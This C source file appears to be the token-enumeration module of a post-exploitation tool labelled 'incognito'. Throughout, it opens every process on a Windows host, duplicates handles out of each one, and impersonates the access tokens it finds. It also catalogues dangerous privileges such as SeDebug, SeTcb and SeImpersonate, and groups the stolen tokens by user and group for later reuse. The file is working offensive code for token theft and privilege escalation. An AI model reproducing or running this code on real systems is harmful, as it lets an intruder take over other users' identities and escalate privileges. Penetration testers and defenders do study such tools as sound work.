#define _CRT_SECURE_NO_DEPRECATE 1
#include "../../common/common.h"
#include "list_tokens.h"
#include "token_info.h"
#include "incognito.h"

typedef LONG   NTSTATUS;
typedef VOID   *POBJECT;

typedef enum _OBJECT_INFORMATION_CLASS
{
	ObjectBasicInformation,
	ObjectNameInformation,
	ObjectTypeInformation,
	ObjectAllTypesInformation,
	ObjectHandleInformation
} OBJECT_INFORMATION_CLASS;

typedef struct _SYSTEM_HANDLE
{
   ULONG           uIdProcess;
   UCHAR           ObjectType;
   UCHAR           Flags;
   USHORT          Handle;
   POBJECT         pObject;
   ACCESS_MASK     GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
   ULONG                   uCount;
   SYSTEM_HANDLE   Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    BYTE Reserved1[52];
    PVOID Reserved2[3];
    HANDLE UniqueProcessId;
    PVOID Reserved3;
    ULONG HandleCount;
    BYTE Reserved4[4];
    PVOID Reserved5[11];
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef struct _UNICODE_STRING
{
   USHORT Length;
   USHORT MaximumLength;
   PWSTR  Buffer;
} UNICODE_STRING;

#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH             ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_OVERFLOW                  ((NTSTATUS)0x80000005L)
#define SystemHandleInformation                 16
#define SystemProcessInformation				5

typedef NTSTATUS (WINAPI *NTQUERYSYSTEMINFORMATION)(DWORD SystemInformationClass,
                                                    PVOID SystemInformation,
                                                    DWORD SystemInformationLength,
                                                    PDWORD ReturnLength);

typedef NTSTATUS (WINAPI *NTQUERYOBJECT)(HANDLE ObjectHandle,
                                         OBJECT_INFORMATION_CLASS ObjectInformationClass,
                                         PVOID ObjectInformation,
                                         DWORD Length,
                                         PDWORD ResultLength);

NTQUERYOBJECT              NtQueryObject ;
NTQUERYSYSTEMINFORMATION   NtQuerySystemInformation;

LPWSTR         GetObjectInfo(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass);

typedef UNICODE_STRING OBJECT_NAME_INFORMATION;
typedef UNICODE_STRING *POBJECT_NAME_INFORMATION;

LPWSTR GetObjectInfo(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass)
{
   LPWSTR data = NULL;
   DWORD dwSize = sizeof(OBJECT_NAME_INFORMATION);
   POBJECT_NAME_INFORMATION pObjectInfo = (POBJECT_NAME_INFORMATION) malloc(dwSize);

   NTSTATUS ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
   if((ntReturn == STATUS_BUFFER_OVERFLOW) || (ntReturn == STATUS_INFO_LENGTH_MISMATCH)){
      pObjectInfo =realloc(pObjectInfo ,dwSize);
      ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
   }
   if((ntReturn >= STATUS_SUCCESS) && (pObjectInfo->Buffer != NULL))
   {
      data = (LPWSTR) calloc(pObjectInfo->Length, sizeof(WCHAR));
      CopyMemory(data, pObjectInfo->Buffer, pObjectInfo->Length);
   }
   free(pObjectInfo);
   return data;
}

int compare_token_names(const unique_user_token *a, const unique_user_token *b)
{
	return _wcsicmp(a->username, b->username);
}

SavedToken *get_token_list(DWORD *num_tokens_enum, TOKEN_PRIVS *token_privs)
{
	DWORD total = 0, i, j, num_tokens = 0, token_list_size = BUF_SIZE, dwSize = sizeof(SYSTEM_HANDLE_INFORMATION);
	HANDLE process, hObject;
	PSYSTEM_PROCESS_INFORMATION pProcessInfo = NULL;
	PSYSTEM_PROCESS_INFORMATION original_pProcessInfo = NULL;
	NTSTATUS ntReturn;
	BOOL bMoreProcesses = TRUE;

	LPVOID TokenPrivilegesInfo[BUF_SIZE];
	DWORD returned_privileges_length, returned_name_length;
	wchar_t privilege_name[BUF_SIZE];
	HANDLE hObject2 = NULL;

	SavedToken *token_list = (SavedToken*)calloc(token_list_size, sizeof(SavedToken));
	*num_tokens_enum = 0;

	dprintf("[INCOGNITO] Preparing for token enumeration");
	token_privs->SE_ASSIGNPRIMARYTOKEN_PRIVILEGE = FALSE;
	token_privs->SE_CREATE_TOKEN_PRIVILEGE = FALSE;
	token_privs->SE_TCB_PRIVILEGE = FALSE;
	token_privs->SE_TAKE_OWNERSHIP_PRIVILEGE = FALSE;
	token_privs->SE_BACKUP_PRIVILEGE = FALSE;
	token_privs->SE_RESTORE_PRIVILEGE = FALSE;
	token_privs->SE_DEBUG_PRIVILEGE = FALSE;
	token_privs->SE_IMPERSONATE_PRIVILEGE = FALSE;
	token_privs->SE_RELABEL_PRIVILEGE = FALSE;
	token_privs->SE_LOAD_DRIVER_PRIVILEGE = FALSE;

	// Enable debug privs if possible
	dprintf("[INCOGNITO] Opening current process token");
	if (!OpenProcessToken(GetCurrentProcess(), GENERIC_ALL/*MAXIMUM_ALLOWED*/, &hObject))
	{
		dprintf("[INCOGNITO] Opening current process token failed with %u (%x)", GetLastError(), GetLastError());
		free(token_list);
		return NULL;
	}
	dprintf("[INCOGNITO] Process opened");
	has_impersonate_priv(hObject);

	dprintf("[INCOGNITO] Grabbing function handles");
	NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQuerySystemInformation");
	NtQueryObject = (NTQUERYOBJECT)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQueryObject");
	dwSize = 256 * 1000;

	pProcessInfo = (PSYSTEM_PROCESS_INFORMATION)malloc(dwSize);
	dprintf("[INCOGNITO] Getting system information");
	ntReturn = NtQuerySystemInformation(SystemProcessInformation, pProcessInfo, dwSize, &dwSize);

	while (ntReturn == STATUS_INFO_LENGTH_MISMATCH)
	{
		dprintf("[INCOGNITO] Length mismatch, retrying ...");
		free(pProcessInfo);
		pProcessInfo = (PSYSTEM_PROCESS_INFORMATION)malloc(dwSize);
		ntReturn = NtQuerySystemInformation(SystemProcessInformation, pProcessInfo, dwSize, &dwSize);
	}

	original_pProcessInfo = pProcessInfo;

	if (ntReturn == STATUS_SUCCESS)
	{
		dprintf("[INCOGNITO] Looking good, continuing processing...");
		while (bMoreProcesses)
		{
			dprintf("[INCOGNITO] NextEntryoffset: %u", pProcessInfo->NextEntryOffset);
			if (pProcessInfo->NextEntryOffset == 0)
			{
				bMoreProcesses = FALSE;
			}

			// if has impersonate privs, only needs read access
			dprintf("[INCOGNITO] Looking good, continuing processing...");
			process = OpenProcess(MAXIMUM_ALLOWED, FALSE, (DWORD)(DWORD_PTR)pProcessInfo->UniqueProcessId);

			if (process == NULL)
			{
				dprintf("[INCOGNITO] Failed to open process %u (%x)", (DWORD)(DWORD_PTR)pProcessInfo->UniqueProcessId, (DWORD)(DWORD_PTR)pProcessInfo->UniqueProcessId);
			}
			else
			{
				dprintf("[INCOGNITO] Iterating %u processes for %u (%x)", pProcessInfo->HandleCount, (DWORD)(DWORD_PTR)pProcessInfo->UniqueProcessId, (DWORD)(DWORD_PTR)pProcessInfo->UniqueProcessId);
				for (i = 0; i < pProcessInfo->HandleCount; i++)
				{
					hObject = NULL;

					if (DuplicateHandle(process, (HANDLE)(DWORD_PTR)((i + 1) * 4), GetCurrentProcess(), &hObject, MAXIMUM_ALLOWED, FALSE, 0x02))
					{
						LPWSTR lpwsType = NULL;
						lpwsType = GetObjectInfo(hObject, ObjectTypeInformation);
						if (lpwsType)
						{
							if (wcscmp(lpwsType, L"Token") && (ImpersonateLoggedOnUser(hObject)))
							{
								// ImpersonateLoggedOnUser() always returns true. Need to check whether impersonated token kept impersonate status - failure degrades to identification
								// also revert to self after getting new token context
								// only process if it was impersonation or higher
								OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hObject2);
								RevertToSelf();
								if (is_impersonation_token(hObject2))
								{
									// Reallocate space if necessary
									if (*num_tokens_enum >= token_list_size)
									{
										token_list_size *= 2;
										token_list = (SavedToken*)realloc(token_list, token_list_size * sizeof(SavedToken));
										if (!token_list)
										{
											CloseHandle(hObject2);
											CloseHandle(hObject);
											CloseHandle(process);
											goto cleanup;
										}
									}

									token_list[*num_tokens_enum].token = hObject;
									get_domain_username_from_token(hObject, token_list[*num_tokens_enum].username);

									if (GetTokenInformation(hObject, TokenPrivileges, TokenPrivilegesInfo, BUF_SIZE, &returned_privileges_length))
									{
										if (((TOKEN_PRIVILEGES*)TokenPrivilegesInfo)->PrivilegeCount > 0)
										{
											for (j = 0; j < ((TOKEN_PRIVILEGES*)TokenPrivilegesInfo)->PrivilegeCount; j++)
											{
												returned_name_length = BUF_SIZE;
												LookupPrivilegeNameW(NULL, &(((TOKEN_PRIVILEGES*)TokenPrivilegesInfo)->Privileges[j].Luid), privilege_name, &returned_name_length);
												if (wcscmp(privilege_name, L"SeAssignPrimaryTokenPrivilege") == 0)
												{
													token_privs->SE_ASSIGNPRIMARYTOKEN_PRIVILEGE = TRUE;
												}
												else if (wcscmp(privilege_name, L"SeCreateTokenPrivilege") == 0)
												{
													token_privs->SE_CREATE_TOKEN_PRIVILEGE = TRUE;
												}
												else if (wcscmp(privilege_name, L"SeTcbPrivilege") == 0)
												{
													token_privs->SE_TCB_PRIVILEGE = TRUE;
												}
												else if (wcscmp(privilege_name, L"SeTakeOwnershipPrivilege") == 0)
												{
													token_privs->SE_TAKE_OWNERSHIP_PRIVILEGE = TRUE;
												}
												else if (wcscmp(privilege_name, L"SeBackupPrivilege") == 0)
												{
													token_privs->SE_BACKUP_PRIVILEGE = TRUE;
												}
												else if (wcscmp(privilege_name, L"SeRestorePrivilege") == 0)
												{
													token_privs->SE_RESTORE_PRIVILEGE = TRUE;
												}
												else if (wcscmp(privilege_name, L"SeDebugPrivilege") == 0)
												{
													token_privs->SE_DEBUG_PRIVILEGE = TRUE;
												}
												else if (wcscmp(privilege_name, L"SeImpersonatePrivilege") == 0)
												{
													token_privs->SE_IMPERSONATE_PRIVILEGE = TRUE;
												}
												else if (wcscmp(privilege_name, L"SeRelabelPrivilege") == 0)
												{
													token_privs->SE_RELABEL_PRIVILEGE = TRUE;
												}
												else if (wcscmp(privilege_name, L"SeLoadDriverPrivilege") == 0)
												{
													token_privs->SE_LOAD_DRIVER_PRIVILEGE = TRUE;
												}
											}
										}
									}

									(*num_tokens_enum)++;
								}
								else {
									CloseHandle(hObject);
								}
								CloseHandle(hObject2);
							}
							else {
								CloseHandle(hObject);
							}
							free(lpwsType);
						}
						else {
							CloseHandle(hObject);
						}
					}
				}

				// Also process primary
				// if has impersonate privs, only needs read access
				if (OpenProcessToken(process, MAXIMUM_ALLOWED, &hObject))
				{
					if (ImpersonateLoggedOnUser(hObject)) {
						// ImpersonateLoggedOnUser() always returns true. Need to check whether impersonated token kept impersonate status - failure degrades to identification
						// also revert to self after getting new token context
						// only process if it was impersonation or higher
						if (OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hObject2))
						{
							RevertToSelf();
							if (is_impersonation_token(hObject2))
							{
								token_list[*num_tokens_enum].token = hObject;
								get_domain_username_from_token(hObject, token_list[*num_tokens_enum].username);
								(*num_tokens_enum)++;

								if (GetTokenInformation(hObject, TokenPrivileges, TokenPrivilegesInfo, BUF_SIZE, &returned_privileges_length))
								{
									for (i = 0; i < ((TOKEN_PRIVILEGES*)TokenPrivilegesInfo)->PrivilegeCount; i++)
									{
										returned_name_length = BUF_SIZE;
										LookupPrivilegeNameW(NULL, &(((TOKEN_PRIVILEGES*)TokenPrivilegesInfo)->Privileges[i].Luid), privilege_name, &returned_name_length);
										if (wcscmp(privilege_name, L"SeAssignPrimaryTokenPrivilege") == 0)
										{
											token_privs->SE_ASSIGNPRIMARYTOKEN_PRIVILEGE = TRUE;
										}
										else if (wcscmp(privilege_name, L"SeCreateTokenPrivilege") == 0)
										{
											token_privs->SE_CREATE_TOKEN_PRIVILEGE = TRUE;
										}
										else if (wcscmp(privilege_name, L"SeTcbPrivilege") == 0)
										{
											token_privs->SE_TCB_PRIVILEGE = TRUE;
										}
										else if (wcscmp(privilege_name, L"SeTakeOwnershipPrivilege") == 0)
										{
											token_privs->SE_TAKE_OWNERSHIP_PRIVILEGE = TRUE;
										}
										else if (wcscmp(privilege_name, L"SeBackupPrivilege") == 0)
										{
											token_privs->SE_BACKUP_PRIVILEGE = TRUE;
										}
										else if (wcscmp(privilege_name, L"SeRestorePrivilege") == 0)
										{
											token_privs->SE_RESTORE_PRIVILEGE = TRUE;
										}
										else if (wcscmp(privilege_name, L"SeDebugPrivilege") == 0)
										{
											token_privs->SE_DEBUG_PRIVILEGE = TRUE;
										}
										else if (wcscmp(privilege_name, L"SeImpersonatePrivilege") == 0)
										{
											token_privs->SE_IMPERSONATE_PRIVILEGE = TRUE;
										}
										else if (wcscmp(privilege_name, L"SeRelabelPrivilege") == 0)
										{
											token_privs->SE_RELABEL_PRIVILEGE = TRUE;
										}
										else if (wcscmp(privilege_name, L"SeLoadDriverPrivilege") == 0)
										{
											token_privs->SE_LOAD_DRIVER_PRIVILEGE = TRUE;
										}
									}
								}
							}
							else {
								CloseHandle(hObject);
							}
							CloseHandle(hObject2);
						}
						else {
							CloseHandle(hObject);
						}
					}
					else {
						dprintf("[INCOGNITO] Failed next level impersonation, ImpersonateLoggedOnUser failed with %u (%x)", GetLastError(), GetLastError());
						CloseHandle(hObject);
					}
				}
				else
				{
					dprintf("[INCOGNITO] Failed next level impersonation, OpenProcessToken failed with %u (%x)", GetLastError(), GetLastError());
				}
				CloseHandle(process);
			}

			dprintf("[INCOGNITO] Moving to next process from %p", pProcessInfo);
			pProcessInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + (ULONG_PTR)pProcessInfo->NextEntryOffset);
			dprintf("[INCOGNITO] Process now %p", pProcessInfo);
		}
	}

cleanup:
	free(original_pProcessInfo);

	dprintf("[INCOGNITO] Done with getting token list");
	return token_list;
}

void process_user_token(HANDLE token, unique_user_token *uniq_tokens, DWORD *num_tokens, TOKEN_ORDER token_order)
{
	DWORD i, j, num_groups = 0;
	wchar_t *full_name, **group_name_array = NULL;
	BOOL user_exists = FALSE;

	// If token is NULL then return
	if (!token)
	{
		return;
	}

	// Get token user or groups
	if (token_order == BY_USER)
	{
		full_name = calloc(BUF_SIZE, sizeof(wchar_t));
		num_groups = 1;
		if (!get_domain_username_from_token(token, full_name))
		{
			goto cleanup;
		}
	}
	else if (token_order == BY_GROUP
		&& !get_domain_groups_from_token(token, &group_name_array, &num_groups))
	{
		goto cleanup;
	}

	for (i = 0; i < num_groups; i++)
	{
		if (token_order == BY_GROUP)
		{
			full_name = group_name_array[i];
		}

		// Check
		wchar_t *name = wcschr(full_name, L'\\') + 1;
		if (!_wcsicmp(L"None", name) ||
			!_wcsicmp(L"Everyone", name) ||
			!_wcsicmp(L"LOCAL", name) ||
			!_wcsicmp(L"NULL SID", name) ||
			!_wcsicmp(L"CONSOLE LOGON", name))
		{
			continue;
		}

		// Check to see if username has been seen before
		for (j = 0; j < *num_tokens; j++)
		{
			// If found then increment the number and set delegation flag if appropriate
			if (!_wcsicmp(uniq_tokens[j].username, full_name))
			{
				uniq_tokens[j].token_num++;
				user_exists = TRUE;
				if (is_delegation_token(token))
				{
					uniq_tokens[j].delegation_available = TRUE;
				}
				if (is_impersonation_token(token))
				{
					uniq_tokens[j].impersonation_available = TRUE;
				}
				break;
			}
		}

		// If token user has not been seen yet then create new entry
		if (!user_exists)
		{
			wcscpy_s(uniq_tokens[*num_tokens].username, MAX_USERNAME, full_name);
			uniq_tokens[*num_tokens].token_num = 1;
			uniq_tokens[*num_tokens].delegation_available = FALSE;
			uniq_tokens[*num_tokens].impersonation_available = FALSE;

			if (is_delegation_token(token))
			{
				uniq_tokens[*num_tokens].delegation_available = TRUE;
			}
			if (is_impersonation_token(token))
			{
				uniq_tokens[*num_tokens].impersonation_available = TRUE;
			}

			(*num_tokens)++;
		}
		else
		{
			user_exists = FALSE;
		}

		// Cleanup
		if (token_order == BY_GROUP && group_name_array[i])
		{
			free(group_name_array[i]);
		}
	}

	// Cleanup
cleanup:
	if (token_order == BY_GROUP && group_name_array)
	{
		free(group_name_array);
	}
	else if (token_order == BY_USER && full_name)
	{
		free(full_name);
	}
}
